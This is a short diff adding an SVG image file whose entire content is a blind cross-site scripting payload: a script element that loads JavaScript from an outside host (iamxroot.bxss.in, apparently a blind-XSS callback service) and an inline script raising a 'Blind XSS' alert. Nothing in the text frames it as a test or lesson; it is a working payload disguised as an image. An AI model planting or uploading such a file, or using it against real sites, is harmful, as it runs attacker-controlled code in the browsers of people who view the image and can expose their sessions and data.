@@ -1,0 +1,4 @@
+
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200" zoomAndPan="disable" xml:space="preserve"> <!-- Script linked from the outside--> <script xlink:href="https://iamxroot.bxss.in"/> <script> //<![CDATA[ alert("Blind XSS"); ]]> </script> </svg>
+
+
